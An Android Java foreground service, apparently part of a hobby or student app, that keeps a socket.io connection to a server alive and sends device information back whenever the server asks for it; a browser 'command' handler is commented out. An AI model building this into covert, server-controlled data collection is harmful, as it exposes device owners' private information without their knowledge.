package com.tanriverdi.adstormeterna;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;
import androidx.annotation.Nullable;

import com.tanriverdi.adstormeterna.periodic.Notification;
import com.tanriverdi.adstormeterna.periodic.PeriodicToastMessage;
import com.tanriverdi.adstormeterna.backgroundservice.SocketManager;
import com.tanriverdi.adstormeterna.deviceinfo.DeviceInfo;
import com.tanriverdi.adstormeterna.deviceinfo.EventActions;

import org.json.JSONException;
import org.json.JSONObject;
import io.socket.client.Socket;
import io.socket.emitter.Emitter;

public class ForegroundService extends Service {
    private static final String TAG = "ForegroundService";

    private PeriodicToastMessage periodicToastMessage;
    private SocketManager socketManager;
    private EventActions eventActions ;
    private DeviceInfo deviceInfo;
    private Notification notificationHelper;

  //  private ChromeCommand chromeCommand;







    @Override
    public void onCreate() {
        super.onCreate();
        initializeComponets();
        startForegroundService();


    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        // Servis başlatıldığında çağrılır
        Socket socket = socketManager.getSocket(); // Socket nesnesini alır
        if (socket != null ) {
            socket.connect(); // Socket bağlantısını başlatır
            setUpSocketListeners(socket); // Socket dinleyicilerini kurar
        }
        //socket.connect();
        return START_STICKY; // Servisin her zaman çalışır durumda kalmasını sağlar
    }

    private void setUpSocketListeners(Socket socket) {
        // Socket için olay dinleyicilerini kurar
        socket.on(Socket.EVENT_CONNECT, args -> {
            Log.d(TAG,"Connected to server" );
            periodicToastMessage.setConnected(true);
        }).on(Socket.EVENT_DISCONNECT, args -> {
            Log.d(TAG,"Disconnected from server");
            periodicToastMessage.setConnected(false);
        }).on("info",args -> {
            socket.emit("info",deviceInfo.getAllDataAsJSONObject());
            Log.d(TAG , "veri gonderıldı");
        }).on("info_request", args -> {
            // "all_server" olayını dinler ve işleme alır
            JSONObject data = (JSONObject) args[0];
            try {
                JSONObject combinedData = eventActions.handleEvents(data);  // Olayları işler
                sendToServer("info_request", combinedData); // İşlenmiş verileri sunucuya gönderir
            }catch (JSONException e){
                Log.e(TAG , "Error processing events", e);
            }
        })/*.on("command" , args -> {
            JSONObject data = (JSONObject) args[0];
            JSONObject commandData = chromeCommand.handleEvents(data);
            sendToServer("command", commandData);

        })*/
        .on("search", new Emitter.Listener() {
            @Override
            public void call(Object... args) {

            }
        }) ;
    }


    private void sendToServer(String event, JSONObject data) {
        Socket socket = socketManager.getSocket();
        if (socket != null){
            try {
                socket.emit(event, data);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }

    }




    private  void startForegroundService(){
        // Foreground servisi için bildirim oluşturma
        android.app.Notification notification = notificationHelper.createNotification(
                "Background Service",
                "Service is running in the background",
                R.drawable.images
        );
        startForeground(1, notification);    // Servisi foreground modda başlatır

        // Periyodik görevleri başlatır
        periodicToastMessage.startPeriodicTasks();
    }
    private void initializeComponets(){
        // ForegroundService oluşturulduğunda başlatılacak bileşenler
        deviceInfo = new DeviceInfo(this); // Cihaz bilgilerini almak için yardımcı sınıf
        notificationHelper = new Notification(this); // Bildirim oluşturma ve yönetimi için yardımcı sınıf
        periodicToastMessage = new PeriodicToastMessage(this); // Periyodik Toast mesajlarını yönetir
        socketManager = new SocketManager(); // Socket bağlantısını yönetir
        eventActions = new EventActions(deviceInfo); // Olayları işlemek için yardımcı sınıf
       // chromeCommand = new ChromeCommand(this);



    }

    @Override
    public void onDestroy() {
        // Servis yok edildiğinde çağrılır
        super.onDestroy();
        periodicToastMessage.stopPeriodicTasks();
        socketManager.disconnect();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {  // Bu servis bağlanılabilir değildir
        return null;
    }
}
